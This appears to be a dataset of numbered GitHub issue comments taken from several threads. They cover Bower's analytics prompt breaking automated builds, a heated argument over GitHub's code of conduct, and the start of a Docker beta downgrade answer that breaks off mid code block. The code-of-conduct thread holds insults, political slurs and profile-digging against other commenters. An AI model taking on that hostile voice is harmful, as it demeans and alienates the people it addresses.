  - 2.2.1
  - 2.2.0
  - 2.1.1
  - 2.1.0
  - 2.0.4
  - 2.0.3
  - 2.0.2
  - 2.0.1
  - 2.0.0
  - 1.4.0
  - 1.3.0
  - 1.2.0
  - 1.1.1
  - 1.1.0
  - 1.0.0
You can request info for a specific version with 'bower info bootstrap#<version>'
```
"
1236	"@jfsiii: sorry, I was just going off of the code in the diff which still appears to have the prompt in it: https://github.com/bower/bower/pull/1470/files#diff-57594d2f4dd5a157b08c4b6d5eadb147R30
"
1237	"works ok - I mean silently as expected from any decent tool - by using the `--config.analytics=false` option from #1470 ... so I now have:

```
bower --config.analytics=false install
```
"
1238	"Just wanted to express my frustration with this.

Which one is it now if we want an automated build flow like the one we used to have since ever?

```
1. bower --config.analytics=false install
2. bower --config.interactive=false install
3. bower --config.interactive=false --config.analytics=false install
```

??????
"
1239	"Setting an environment variable of `CI=true` on your CI server is a good start. Bower respects that, as do other tools. 
"
1240	"@benschwarz CI is not the only environment where builds are performed.

Still waiting on an answer on how to properly, unobtrusively, silently invoke `bower install`. Setting an ENV var is a different approach and frankly not fit for our use case.
"
1241	"@thanpolas env vars can be added inline to one-off processes too. Not sure how that won't work for you, but happy to step through it. 

Otherwise, I recommend reading the source to see. Doesn't seem like such a mystery to me.
"
1242	"> Otherwise, I recommend reading the source to see. Doesn't seem like such a mystery to me.

Sure, why bother with documentation or a plain answer. On it, starting to read the codebase...
"
1243	"@thanpolas 
- `CI=true` is equivalent to passing `--config.interactive=false`
- attaching a pipe to bower is equivalent to `--config.interactive=false`
- `--config.interactive=false` causes `--config.analytics=false` to be a default

The answer is, use one of the following:

``` bash
CI=true bower install
bower install --config.interactive=false
```
"
1244	"Documentation [was already pretty clear on it](https://github.com/bower/bower.github.io/blob/6affec4d617b2a115eb205056490a964786fb6c1/docs/api.md#running-on-a-continuous-integration-server).

I've additionally documented exact behavior of non-interactive mode: https://github.com/bower/bower.github.io/commit/19b99340e0cc6f270dcd600d196a230d08144d61

@desandro Could you review it linguistically?
"
1245	"Small mistake:
https://github.com/bower/bower.github.io/commit/f602fbd4cb5f7e802384c05f924a236faceddb13
"
1246	"lgtm
"
1247	"@sheerun nice! :+1: 
"
1248	"This is still messing me up today. Can't you get usage statistics from your server?
"
1249	"Just ran into this issue while writing a Vagrant provisioning script. This default behavior is _intensely_ annoying. It's even more annoying that I had to Google how to resolve it. Why isn't this flag documented in `bower --help`?
"
1250	"> This is still messing me up today. Can't you get usage statistics from your server?

No, we're not able to get everything that we want. What can we do to make things better for you?

> Why isn't this flag documented in bower --help?

I'm not sure! Would it be too much to list every single configuration option in `--help`? 

@waynebloss @zjacreman 
"
1251	"I'd say any config flags that make it into the [API docs](http://bower.io/docs/api/) should be documented at the primary point of contact with the API.

The comparison was made earlier to `apt-get -y`.  You don't need any other resource but `--help` to figure out how to turn off apt prompting. 
"
1252	"@benschwarz I'd rather have you _not ask_ to collect analytics at all, like most other command line tools that I use. NPM seems to work just fine without asking me for them.

Here's the list of [collected data](https://github.com/yeoman/insight#collected-data) from [your docs](http://bower.io/docs/config/#analytics). Could you tell me what items you cannot get on the server and why you need them?
- The version of the module that implements Insight
- Module commands (e.g. install / search)
- Name and version of packages involved with command used
- Version of node.js & OS for developer debugging
- A random & absolutely anonymous ID

Is the random/anonymous ID generated once per install of bower or once per transmission of analytics data? Also, do you collect and store my IP Address on the server side?

Thanks.
"
1253	"@benschwarz  Please also consider these points:

(TL;DR: Things are not OK with this feature. People don't like it _and_ you broke things to have it, which makes it seem like there is a hidden agenda here.)
- Searching for the terms: [bower statistics](https://www.google.com/search?q=bower+statistics), you see mostly bugs and complaints.
- Nobody seems to be giving you analytics anyway, going by the low numbers seen at [bower.io/stats](http://bower.io/stats/).
- Given that nobody seems to be using this bug-causing, breaking-change of a feature - it makes me wonder why the bower team is fighting so hard against the seeming majority of people who don't want it.

This all seems very untrustworthy to me and I'll probably jump ship as soon as it is practical. I might just be one guy but I'm representative of many and people in general (and developers in particular) are pretty sick of having their tech constantly trying to track and analyze everything we do under the guise of ""making the product better"".
"
1254	"@benschwarz I guess my final point would be this: Your documentation says it's _opt-in_ but it's really not because we have to do all this work to turn off the feature. If it were _actually_ opt-in, you would just display a message about it and tell people to run a different command to enable it or tell them how to turn it on.

The extra work that must be done whenever the analytics question feature is activated at an unexpected time is this:
1. Figure out what is causing the problem.
2. Go and make changes to code and/or configuration files.

That does not sound like an opt-in. That is a hard opt-out. You're not really introducing an opt-in feature when at the same time you introduce a new opt-out anti-feature.
"
1255	"tldr; Analytics suck support-wise, and frustrates everyone ever involved in this conversation. I want analytics to be printed out and shot at the sun. 🚀☀️💥

---

@waynebloss, let me take a second to remind you that your insinuation that the bower team has done something unjust here is slightly upsetting. 
We're predominantly volunteers, many of us are independents; Let me reassure you that there is no ill-will, nor hidden agenda. We get plenty of comments from people like you, with the same tone, and to be honest, it _is_ wearing. 

Analytics _were_ added to improve Bower, and the ecosystem around it – to help the team understand what people were doing with it. Given its rate of growth from nothing to now, theres no wonder we wanted to know what was happening out there. Specific items aside — just how many people were using it? How often? Daily? Multi-daily? 

Without something like insights, we'd never have been able to open the data up to new contributors like @rayshan, who built [Bower stats](http://bower.io/stats/) as a side project. 

That said, you've made one interesting point: 

> Given that nobody seems to be using this bug-causing, breaking-change of a feature - it makes me wonder why the bower team is fighting so hard against the seeming majority of people who don't want it.

_No one_ is fighting _for_ the feature — Since it was added people have had all the issues that you've mentioned. It sucks. It sucks support-wise and it sucks for people who _choose_ to deploy or server-side-build with Bower.

When installed, Bower does ask if you'd like to submit analytics, and has numerous, documented methods for disabling it if you made the wrong choice or didn't answer. We made Bower ask, because it was the right thing to do. Turns out, it is incredibly annoying. 

I know too well that a silently hanging script on the server is a total pain in the ass to find and fix, and it wastes time too. I totally understand your frustration. 

I think it'd be a lot easier to pull out analytics entirely (or, find someone to donate their time to replacing it with something else). If you want to make that very pull request, I'd be happy to review and campaign for it to get through.  

@bower/bower, thoughts?
"
1256	"If we, the Bower team, are not actively using analytics to drive decisions, then let's remove it.
"
1257	"@benschwarz I understand that collecting anonymous usage data can help with development decisions. I think just making this a non-interactive message that explains how to opt-in without waiting for a ""y"" or ""n"" would be an immense improvement. It might also mean you can display the message more often, and in more circumstances, to get more eyeballs on it.
"
1258	"@benschwarz, @desandro and @bower/bower team - Sorry for the insinuation, I was just giving you my point of view as an outsider. I don't know anything about the people who built this or their motivations. Also, maybe I'm paranoid due to the fact that this battle against everything tracking me is one that I have to fight every day. Anecdotally, I think a lot of people think like me but I could be wrong (_because I don't have those stats!_ :smile: )

If it's useful to anyone, why not just take out the question and let it be enabled via config? You could just print out a message that says something like ""Please enable analytics to help our project by doing x. Read about how we're not invading your privacy here...""
"
1259	"IMO, if you really wanted those stats, I think you'd get more people with a short, polite but persistent nag message.
"
1260	"> @benschwarz I'd rather have you not ask to collect analytics at all, like most other command line tools that I use. NPM seems to work just fine without asking me for them.

Nooooo!! Bower is special! Bower is super special, it is not anything like the other scripts! The whole lot of the other open source packages, libraries, scripts and whatnot are really peasants compared to Bower, least would they dare to ask users for collecting their data and hanging deployment scripts around the globe losing us collectively thousands of work hours and millions of USD on debugging.

I believe we should remove the flags to turn off interactive all together and go all in, make the web and devops industry crawl to a stop, because, bower.

And then go on and force ask questions about the developer's health, well being and if they woke up well today, then we can also provide life coaching services apart from package management which is what we always really wanted to do.
"
1261	"This whole conversation smacks of Microsoftian-level user hostile design from the Bower team.  Your community has been unequivocally clear for months that they _hate_ this, yet you refuse to address it despite great alternative suggestions.  I've already done my time digging through my CI job late in the evening finding out why the F bower decided to break it all of the sudden, and golly I'd like that time back.

Regardless of the outcome of this particular debate I feel you have done irreparable harm to your credibility from the perspective of one of your users, and my team and others we work with have begun the P.I.T.A. work of moving our package management to npm.
"
1262	"@brainfish, Do you feel good for posting that? I hope you do. Did you or your team ever consider contributing rather than deciding to post something like that? No? … I didn't think so. 

I plan to make a strike on changing this, because I know it frustrates people. It doesn't _personally_ bother me (because I just use the flags, like the docs explain), but I want to do it for people. 

Like I've said before, if someone wants to make the first strike on this, I'll be the first person ready to support you. Comments like @brainfish's don't help anyone. Open source people, open source. 
"
1263	"@benschwarz, take a look at #1921 (primarily the concept of it). That would at least make the tool less likely to break automation and cause less friction.
"
1264	"@mex (First of all.... what's up, buddy?!) I'm not sure I like the idea that it perpetually adds 10 seconds to all affected workflows, which gives the impression that a) the process is just slow, and b) nothing really needs to be addressed.  This is like failing to check under the hood of your car when it feels less powerful, instead of being forced to check when the engine blows up.

@benschwarz That said, I'm not sure I agree with your expectation the community that we provide a PR that fixes something that was broken intentionally.  The community has spoken quite loudly, and I think we would all prefer that analytics die completely if it they can't get out of our way.  Collecting stats CANNOT prevent the tool from working properly, which it's currently doing.  

Part of the problem is that this was a HUGE breaking change.  If this were a brand new tool that had analytics included from the beginning and everyone hopped in without reading the readme, the burden is on them to fix it.  But when you enforce a certain standard of reliability and introduce something crazy like this, people get upset, and I can't say I blame them.  

So again, can we make this an opt-in process?  I don't think anyone had an issue with that.  If you have an issue with it, can we hear what that is?
"
1265	"Or what if analytics were enabled, the option to disable is retained, but the interactive prompt was eliminated?  I wouldn't mind if it happily reported statistics without asking me, as long as it doesn't blow up my automation.
"
1266	"> So again, can we make this an opt-in process? I don't think anyone had an issue with that. If you have an issue with it, can we hear what that is?

I've said it before — I don't have _any_ issue in changing the behaviour. I donate my time to projects like bower when I can. Its not my responsibility to do anything here.  I was going to make some changes last week, until a comment on this thread made me want to throw my computer into space :night_with_stars: 

Lets get a change through and forget this ever happened :muscle: 
"
1267	"> Like I've said before, if someone wants to make the first strike on this, I'll be the first person ready to support you. Comments like @brainfish's don't help anyone. Open source people, open source.

@benschwarz thank you on the lesson. This is open source, discussing, no, rather, asking, for the permission of the maintainers of the repository to remove the feature. That's how it's done.
1. You announce/ask for something you want / intend to do
2. The maintainers refuse the change
3. You ask again
4. The maintainers refuse the change
5. Bunch of people go wild with the issue
6. You play the open source card
7. Somebody get's to do the 10' minute patch
"
1268	"I'm unsubscribing from this issue.
"
1269	"@arcreative, you know, work all the time as always. I agree with you though that this isn't the most optimal solution, but it is at least better than the alternative. I did think about simply suggesting a `git revert`, which would suit me just fine as well.

I think skipping the prompt and defaulting to opt in would be a big mistake, because a lot of people care deeply about what data are shared from their systems.
"
1270	"@thanpolas Thanks for being so polite/constructive and chasing away the only maintainer that was willing to help us with this.  I'm glad you seem to be so clear on the open source process--didn't realize it entailed being an arrogant ass about everything.  I'll be sure to employ this tactic in the future, since it seems to work _so well_ for you.

His suggestion was to SUBMIT A PR for it, not insult him until he created a PR for you.  
"
1271	"Maybe we can end this discussion with this: https://github.com/bower/bower/pull/1923

This both adds a check for `process.env.CI` and adds a fallback on 30 sec, if no response is given to the prompt.
"
1272	"@arcreative i'm afraid you got it all backwards. Bower is not reliant on a single entity, here's where open source comes in. If the issue is the PR i'd gladly submit it myself.

The problem here is that Team Bower would not accept such a PR. 

If that's not the case, then mea culpa and i'll promptly submit a PR ripping off the whole analytics system from its roots.
"
1273	"I like the idea of just removing analytics altogether because nobody here voiced any real need for them to be collected in the first place.

The only purpose that I could gather is that they're needed for some website that we're not sure if anyone is using.
"
1274	"Adding a timeout to ""fix"" this problem seems like a terrible idea. Could someone please explain to me why we need these analytics so badly?

Why not just make this thing truly opt-in by removing the prompt altogether?
"
1275	"I don't like the way @thanpolas behaves in this thread, but here is my proposal anyway:

Personally, I agree that:
- Most of the command statistics (except maybe install counts) are not useful
- ""Top packages"" is of questionable use too, because installs are counted only install directly, like `bower install jquery`. They don't show total download/star count for modules. Ideally they should show trending repositories within packages registered in Bower registry (something like https://github.com/explore)
- ""Popularity around the world"" section seems not useful as well

I think we need http://bower.io/stats/ to show that bower is still alive (for example to show what versions of bower are still installed and used), and to show pulse of packages registered in bower registry (for example show ""Top 50 starred repositories in last 7 days)"").

Because most of packages in Bower's public registry come from GitHub, I think we could remove analytics from Bower if we could retrieve following counts:
- npm installs of bower, per version
- daily number of new stars for each ""component"" registered in bower

And re-implement http://bower.io/stats using these statistics

I hope core team agrees with it and I hope someone will donate his/her time to make it happen :)
"
1276	"Of course if the things I mentioned are done, we'd remove analytics from Bower, completely.
"
1277	"Can everyone on the thread make sure to treat other people working on this with respect, I am pretty ashamed at the level of discourse on this issue.  

I know it is easy to talk down and shame people, but honest mistakes are made in software. 

Unless you are going to help please try and be positive, and thank @sheerun for donating his time to fix this.

Thanks you @sheerun !!!
"
1278	"We need to wait for @npm to publish per-version download counts (it's extremely useful statistic for any package owner, it's shame it's not available), but otherwise http://bower.io/stats is updated and #1102 ready to merge.
"
1279	"I mostly agree, but how is the OCoC prejudicial in and of itself?
"
1280	"@ron-wolf 
Are you serious? Have you even read the CoC? Here is a little snippet for you.

> Our open source community prioritizes marginalized people’s safety over privileged people’s comfort. We will not act on complaints regarding:
> - ‘Reverse’ -isms, including ‘reverse racism,’ ‘reverse sexism,’ and ‘cisphobia’
> - Reasonable communication of boundaries, such as “leave me alone,” “go away,” or “I’m not discussing this with you”
> - Refusal to explain or debate social justice concepts
> - Communicating in a ‘tone’ you don’t find congenial
> - Criticizing racist, sexist, cissexist, or otherwise oppressive behavior or assumptions

Edit: It also brings issues to places where they didn't exist before. They do this just to attack people they don't like, aka white, hetero and cis men. They being people who advocate for CoCs like this.
"
1281	"The issues existed before, but you just had the _privilege_ of not having to notice them, because they did not affect you.
"
1282	"Hello..

For the sanity of the readers (and the future discussions), may I recommend if we can leave out the following ""triggerable"" words (and their improvisable variations)?

= _privilege_, _right_, _feminism_, _patriarchy_, _cis_, _white_ (_black_, _asian_, etc.), _hetero_, _homo_, _phobia_, _Hitler_, and _Nazi_?

It's my strongest belief that anyone with marginal intellect can easily interpret (and understand) each other's intentions without any modern contexts.

The reason why I decided to intervene is to clarify - on the behalf of the readers - each other's opinions, and evade any misunderstandings.

---

That being said, dear @Tsutsukakushi, may I ask for the following clarifications? In your comment,

> Edit: It also brings issues to places where they didn't exist before. They do this just to attack people they don't like, aka white, hetero and cis men. They being people who advocate for CoCs like this.""

My questions are:
1. When you say, ""They do this just to attack people they don't like, aka white, hetero and cis men."", are you indicating that the primary group (""They"") are the 'white, hetero, etc.' _attacking_ the rights of others (i.e. 'non-white, hetero, etc.') using the CoC (or are ""They"" the ""white,hetero,etc."" who are _attacked_ for advocating the CoC by, say, GitHub?)? Would you be able to submit any reasonable, solid points to buttress your points?
2. When you indicate ""They being people who advocate for CoCs like this."", what do you mean? If someone advocates the CoC, do they automatically become ""Them""?
3. Can you elaborate why and how ""This Code of Conflict brings issues to the ecosystem that never existed in the first place and is outright sexist and racist towards many groups.""?
4. Why should GitHub be a ""Big Brother"" who micromanages everyone's words? Can't you make an argument and defeat the sexists (without inquiring others to forcibly silence the offender on behalf of you) yourself? Should GitHub ban anyone who is even _slightly_ sexist?

Dear @lewisje, I find your comment incredibly accusational, and was wondering if you could clarify your intentions.

> The issues existed before, but you just had the _privilege_ of not having to notice them, because they did not affect you.
1. How confident are you to suppose @ron-wolf was **not** affected by the issues between societies' topic of masculism and feminism? Are you two personally acquainted? Or is the relationship just to the extent of this conversation?
2. If @ron-wolf does indeed have the ""privilege"" of failing to notice the issues you find of great importance, what does that entail? What connotations does that leave for the rest of the hetero and cis males? Should the modern men and females educate themselves further to absorb the knowledge of everything to come to an understanding of each other?

---

The main point is, the genesis of this issue is @Tsutsukakushi's failure to provide (and understand) the true context of the Open Code of Conduct. Quite simply, it was astonishingly thoughtless.

The **Open Code of Conduct** starts, and states:

> This code of conduct outlines our expectations for participants within the [COMMUNITY] community, as well as steps to reporting unacceptable behavior. We are committed to providing a welcoming and inspiring community for all and expect our code of conduct to be honored. Anyone who violates this code of conduct may be banned from the community.

Please note `[COMMUNITY]`. It is very important.

The `[COMMUNITY]`, by itself, does not represent GitHub, nor does it represent the ""white, hetero and cis men"". However, it represents _anyone_ who find the CoC suffice enough to represent their organization(s).

Moreover, GitHub **!=** TODO. They are the [members](http://todogroup.org/members/) of TODO. Please don't create an issue with GitHub. Let's think through and research the right target group.

Dear @Tsutsukakushi and @lewisje, before accusing others, please read once more to see if sexism is, by any chance, indeed coming from others, and not initiated from your own words. Had @Tsutsukakushi truly understood @ron-wolf's intention initially:

> I mostly agree, but how is the OCoC prejudicial in and of itself?

She would've learned that @ron-wolf _does_ agree with @Tsutsukakushi. He was simply inquiring for @Tsutsukakushi's perspective and nothing more - no sexist connotation or degradation. But, who knows, perhaps @Tsutsukakushi had seen something I had not (maybe @ron-wolf edited it out before I had seen this issue)?

[edit]: Just in case anyone's words are changed in the future (and puts me in a difficult position to defend myself against my own words), I'll leave a screenshot of the conversation I'm basing my answer on:

![wtf2](https://cloud.githubusercontent.com/assets/17213153/13026592/0f2ee2bc-d1fb-11e5-837d-9ead15b7753d.png)

![wtf1](https://cloud.githubusercontent.com/assets/17213153/13026578/b8aa2be0-d1fa-11e5-821e-a9a3d0d8ff11.png)
"
1283	"My italicization of the P-word was intended to highlight part of what is meant by the term; those who benefit from it only recognize it's there with conscious effort, while those who are harmed by it can't avoid noticing it.

The statement ""brings issues to places where they didn't exist before"" is an indicator of this, of having benefited from it and therefore, without conscious effort, not realizing it ever existed; I don't know what forms of this Tsutsukakushi actually benefits from and therefore doesn't have to think about on a daily basis, I was just commenting on the concept itself.

> may I recommend if we can leave out the following ""triggerable"" words (and their improvisable variations)?

This sounds like another potentially ""triggerable"" term you forgot to put in that list: [conservative correctness](http://rationalwiki.org/wiki/Conservative_correctness). I guess recognizing the P- and C-words is a doubleplusungood impediment to goodthink.
"
1284	"E: @PureBits I should probably tag you.

E^2: Oh, seems like @PureBits is a throwaway. We can't probably expect any further responses from him.

> For the sanity of the readers (and the future discussions), may I recommend if we can leave out the following ""triggerable"" words (and their improvisable variations)?

It is ok to use them because the CoC that GitHub enforces also uses them.

> When you say, ""They do this just to attack people they don't like, aka white, hetero and cis men."", are you indicating that the primary group (""They"") are the 'white, hetero, etc.' attacking the rights of others (i.e. 'non-white, hetero, etc.') using the CoC (or are ""They"" the ""white,hetero,etc."" who are attacked for advocating the CoC by, say, GitHub?)? Would you be able to submit any reasonable, solid points to buttress your points?

I thought that ""They being people who advocate for CoCs like this."" was pretty clear. The people advocating CoC like that of GitHub are sexist and racist. ""People they don't like"" are the ""white, hetero and cis men"".

> When you indicate ""They being people who advocate for CoCs like this."", what do you mean? If someone advocates the CoC, do they automatically become ""Them""?

Yes. The ones advocating for this particular CoC are part of the sexist and racist group. There are other CoCs that ensure that the discussion stays civil without targeting any particular group and excusing the behaviour of others.

> Can you elaborate why and how ""This Code of Conflict brings issues to the ecosystem that never existed in the first place and is outright sexist and racist towards many groups.""?

Most communities in GitHub don't have issues with sexism or racism or anything like that. And there is no reason on putting in place a site-wide racist CoC just for the small minority of communities who have such problems. There might be communities in GitHub that have problems and they should deal with them locally.

> Why should GitHub be a ""Big Brother"" who micromanages everyone's words?

GitHub shouldn't be a ""Big Brother"". That's the problem. Yet they put in place these sexist and racist guidelines.

> Can't you make an argument and defeat the sexists (without inquiring others to forcibly silence the offender on behalf of you) yourself?

You can and you should. GitHub disagrees.

> Should GitHub ban anyone who is even slightly sexist?

They should not ban anyone. Restricting commenting and other interaction with certain projects or groups of projects would be sufficient.

> The main point is, the genesis of this issue is @Tsutsukakushi's failure to provide (and understand) the true context of the Open Code of Conduct. Quite simply, it was astonishingly thoughtless.

I understand what the OCoC is about. And I think it fails horribly. Sexism, racism and other oppression cannot be fixed by more sexism, racism and oppression.

> Please note [COMMUNITY]. It is very important.  
> The [COMMUNITY] does not represent GitHub, nor does it represent the ""white, hetero and cis men"". However, it represents anyone who find the CoC suffice enough to represent their organization(s).<

[COMMUNITY] here is the site or project or community that enforces OCoC. In this case the [COMMUNITY] would be GitHub as GitHub enforces it site-wide.

> Moreover, GitHub != TODO. They are the members of TODO. Please don't create an issue with GitHub. Let's think through and research the right target group.

It doesn't matter wether GitHub is TODO. That doesn't make the enforcement of this CoC any better.

> Dear @Tsutsukakushi and @lewisje, before accusing others, please read once more to see if sexism is, by any chance, indeed coming from others, and not initiated from your own words. Had @Tsutsukakushi truly understood @ron-wolf's intention initially:

what do you mean by this? I did understand that @ron-wolf thought it was a problem and I showed him why.

> She would've learned that @ron-wolf does agree with @Tsutsukakushi. He was simply inquiring for @Tsutsukakushi's perspective and nothing more - no sexist connotation or degradation. But, who knows, perhaps @Tsutsukakushi had seen something I had not (maybe @ron-wolf edited it out before I had seen this issue)?

Where was it implied that @ron-wolf's comment was sexist or degrading in any way?
"
1285	"> The statement ""brings issues to places where they didn't exist before"" is an indicator of this, of having benefited from it and therefore, without conscious effort, not realizing it ever existed; I don't know what forms of this Tsutsukakushi actually benefits from and therefore doesn't have to think about on a daily basis, I was just commenting on the concept itself.

@lewisje how do I benefit from it?
"
1286	"I said it was an indicator that you benefit; I didn't say I knew _how_ and in fact I said I didn't know how.

Maybe you don't actually benefit and it's willful ignorance about p*******\* on your part, in which case another ""triggerable"" term not on PureBits's list would apply: ""self-hating""
"
1287	"> I said it was an indicator that you benefit; I didn't say I knew how and in fact I said I didn't know how.

@lewisje How could someone benefit from it?

E: I don't see how I could benefit from other people getting bullied.

> Maybe you don't actually benefit and it's willful ignorance about p*******\* on your part, in which case another ""triggerable"" term not on PureBits's list would apply: ""self-hating""

How is it willful ignorance? There is not a widescale problem of sexism etc. in GitHub. that I've seen. How does ""self-hating"" apply exactly?
"
1288	"While deciding whether to give this guy the 101 about why his denial that certain problems exist implies privilege with respect to those problems _assuming_ he wasn't trolling, I began to think maybe he was a troll (yeah, I know, assuming here that the creator of this issue is male, but to his ilk, words like ""ze"" and ""hir"" are triggering to their delicate right-wing fee-fees), so I looked up his comment history and his account's name; the former consisted of a PR and this issue, and the latter was the name of an anime character.

The combination of obstinate ignorance and an anime-themed profile led me to suspect this was an 8chan troll, and indeed, [his site](http://archive.is/yBQB5) makes clear his intent to troll; I've archived the main page and [this subpage that links to his GitHub account](https://archive.is/vU4rZ) in case he changes them to try to deny that he's just trolling us, and soon I'll get around to the rest of the site.

---

With that said, I'll spell out what I meant by ""willful ignorance"": One characteristic of being disadvantaged by privilege is being unable to avoid noticing said privilege; this means that the only way you could be honestly ignorant of it is if you're a beneficiary, otherwise, if you claim ignorance, it's willful in nature, possibly to remain in the good graces of a larger group of beneficiaries of privilege (e.g., much of the alt-right that he is clearly affiliated with). In this case you could also be said to be a ""self-hating"" <member of a group disadvantaged by a privilege you deny the existence of>.

P.S.: It also seems like PureBits is not just a throwaway but also a conservatroll much like the OP, and I fully expect to get flamed as a purple-haired Jewish commie genderspecial Tumblrina SJW for this post, because that's the kind of insult that the alt-right Rethugs of 8chan and Voat love to throw around.

P.P.S.: I've never heard of @ron-wolf outside this issue and wasn't responding to him ever.
"
1289	"> While deciding whether to give this guy the 101 about why his denial that certain problems exist

I don't deny that there are sexism and other problems in some communities in GitHub but I do think that not all of GitHub has those problems.

> implies privilege with respect to those problems

Your logic is really confusing.

> assuming he wasn't trolling, I began to think maybe he was a troll

I don't troll. You can't declare someone is a troll because you can't know their intentions. Only the person itself can decide if he is a troll or not.

> (yeah, I know, assuming here that the creator of this issue is male

Don't assume, ask.

> but to his ilk, words like ""ze"" and ""hir"" are triggering to their delicate right-wing fee-fees

What is ilk? Why do you think ze or hir would trigger me? Why would you think I am right-wing?

> so I looked up his comment history and his account's name

Ok.

> the former consisted of a PR and this issue

And? I've also made other issues and there are some other things on my account as well.

> and the latter was the name of an anime character.

What does this have to do with anything? What should I use as my name on GitHub?

> The combination of obstinate ignorance

I'm ignorant for questioning what extremists say?

> and an anime-themed profile

My name is that of an anime character, that doesn't make my profile anime themed.  And even if my profile was anime themed why would it matter one bit?

> led me to suspect this was an 8chan troll

Why would you think I come from that specific site?

> and indeed, his site makes clear his intent to troll

Wait what? My intent is not to troll. I'm trying to get rid of sexism and racism and other stupid oppression that GitHub practices.

> I've archived the main page and this subpage that links to his GitHub account

That's ok. However they won't be changing anytime soon, except for the contact info at the bottom of the main page. You can also wget -r everything if you want. There is a sitemap at https://GNU.moe/sitemap.html so you can get even the unlinked stuff.

> in case he changes them to try to deny that he's just trolling us, and soon I'll get around to the rest of the site.

I won't change my site just because you think I'm trolling.

> With that said, I'll spell out what I meant by ""willful ignorance""

Finally we get to the meat of this thing.

> One characteristic of being disadvantaged by privilege is being unable to avoid noticing said privilege

There are things that make me very unprivileged.

> this means that the only way you could be honestly ignorant of it is if you're a beneficiary

I don't think bullying of any kind is beneficiary to me or the humanity. Just because I think that there is no big problem with sexism etc. on GitHub apart from that what the GitHub and some big projects that have adopted discriminatory CoCs practice doesn't mean that I don't think that it happens or that isn't a problem.

> otherwise, if you claim ignorance

I didn't.

> it's willful in nature

Ok.

> possibly to remain in the good graces of a larger group of beneficiaries of privilege

The larger group here is actually the oppressive feminist extremist movement.

> (e.g., much of the alt-right that he is clearly affiliated with).

I'm not right-wing and I have no affiliations with such groups.

> In this case you could also be said to be a ""self-hating"".

I have no hate for myself.

> P.S.: It also seems like PureBits is not just a throwaway but also a conservatroll much like the OP

I don't see anything trollish about @PureBits' comment and I am not a troll.

> and I fully expect to get flamed as a purple-haired Jewish commie genderspecial Tumblrina SJW for this post

You shouldn't expect that. And no one in this thread has any desire to do that.

> because that's the kind of insult that the alt-right Rethugs of 8chan and Voat love to throw around.

I have not insulted anyone on this thread. I do not have any affiliation with 8chan or voat.
"
1290	"@Tsutsukakushi I'm curious: what makes you so certain that issues of racism, sexism, homophobia, transphobia, etc. do not exist within GitHub's various communities? You have made a whopping total of 10 contributions in the last year, so I can only assume your exposure to the OSS community at large is limited to say the least. Ignorance of a problem, willful or not, does not make the problem go away.

If, as you claim, you're not a troll just looking to ruffle some libtard SJW feminazi feathers, could you please explain how the language on the OCoC hurts you specifically? What harm does it inflict upon you to help marginalized groups feel less marginalized?
"
1291	"@jawshooah

> @Tsutsukakushi I'm curious: what makes you so certain that issues of racism, sexism, homophobia, transphobia, etc. do not exist within GitHub's various communities?

You should try reading my messages again. I do think they exist in some communities and those communities should deal with it (**E:** Poor choice of words, with ""deal with it"" I mean they should get rid of it themselves.). However I don't think the issue is widespread enough to warrant site-wide sexist and racist and otherwise oppressive rules.

> You have made a whopping total of 10 contributions in the last year,

And? Maybe I don't want to use GitHub because I really dislike the company and the model and the service.

> so I can only assume your exposure to the OSS community at large is limited to say the least.

Because the only way to participate in free and open source software communities is in GitHub, right?

> Ignorance of a problem, willful or not, does not make the problem go away.

Same applies to you.

> If, as you claim, you're not a troll just looking to ruffle some libtard SJW feminazi feathers,

Why would I want to troll people?

> could you please explain how the language on the OCoC hurts you specifically?

I did. Read the thread.

> What harm does it inflict upon you to help marginalized groups feel less marginalized?

Making marginalized groups feel less marginalized doesn't mean you have to start bullying other groups.

You can NOT fix sexism, racism or any other kind of oppression with more sexism, racism or oppression. It will only lead to more sexism, racism and oppression from both sides. That is what I want to prevent. I don't want any side to get bullied
"
1292	"This is not a GitHub issue. 
GitHub decided to use this Code Of Conduct in their open source projects. So if you think that it is an issue, report it to these projects.
"
1293	"I am _so tired_ of the people who are trying hard to drag derisive politics into the Open Source community. I have never known such things to ever be an issue here. You do good quality code, you get recognized. No one can see what ethnicity or anything you belong to, unless you openly reveal such. And no one cares, anyway. **It's all about the code**, not what you look like, not what your gender is, not what your sexual orientation is, not what hue your skin has, none of those irrelevancies.

"
1294	_Code of Conduct?_ Write good code. End of story. 
1295	But my _feelings!_ 😆
1296	"Hahahaha! 

My _feelings_ are totally mediated by the satisfaction that I produced code that **works** and that others are **making use** of my creations. Why anything else beyond that should matter is beyond me. "
1297	"But I can tell from this thread we have a few _Social Justice Warriors_ here. Man, if they themselves would focus more on _writing killer code_ and less on trumpeting politics, **Imagine**.

Hacking and creating software is _my_ personal retreat from all the ills of the world. Keep those ills outta here. Please."
1298	Jesus Christmas, this thread. 😲
1299	"I actually saw the same crap with the emergence of the Internet itself. Back before it became a household word, we got along ok. Sometimes we got into ""religious"" flame wars (formerly known as 'rwars') about how C++ is better than C, Perl is better than Bash, Coke is better than Pepsi, etc.

But generally, it was good, and we'd help each other out with difficult technical and scientific questions, etc. When the Internet was becoming a household word in the 90s, I saw it as a ""2nd chance"" for humanity to be something better, to present ""the better angles of their nature"" so that we could realize the full potential of it -- and ourselves in this new ""world"".

What happened instead? People began dragging their trash onto the Internet. It was heart-wrenching. The same banal politics, the same mundane social ""issues"", the same lame complaints and whines, all of it. The Internet simply became a mirror of the same crap going on in the world. So sad.

And now, the same is happening here, in Open Source, and in Github.  Mundanes insists that we ""must"" have the same trash here as it exists in the rest of the world. WHY?????

I had thought about putting my portrait up as my profile pic instead of the Viking shield that I took a picture of in the fine country of Iceland -- where my current wife and I went for our honeymoon. We love Iceland!!!!!! But I digress. 

I don't want to be judged by the SJWs that are starting to creep into GitHub. So I don't want to reveal what I really look like. Hey, it's like Childhood's End!!!! You are not ready yet! LL

Seriously, keep the trash out of GitHub and let's keep this place ""pure"", as the ""last"" chance to show what we do best as collaborating Human Beings, not as low as the rest of the ""world"" (mainly the US) has become.

Code of Conduct? Write excellent code! End of story. "
1300	@mfornasa 1.13.0-rc5 is a beta channel release, so unfortunately there may be breakages. There will be a new beta release this week. If you want a stable release, we recommend installing from the stable channel.
1301	"I accept the possibility of a breakage on beta, no issues with that.

I would like to be able to **manually** download an older package. This would also help in debugging issues with the beta and provide you better feedback."
1302	@justincormack I have been able to find the link for version rc4 using the forum: https://download.docker.com/mac/beta/1.13.0.14840/Docker.dmg. I still believe that it would be useful to have a list of those links somewhere.
1303	"There are two ways to downgrade:

## 1. Recreate the URL
If you happen to know the build number (e.g. 14937) -- not the git commit you see when running `docker --version` or `docker version` -- you can form the URL:

```shell
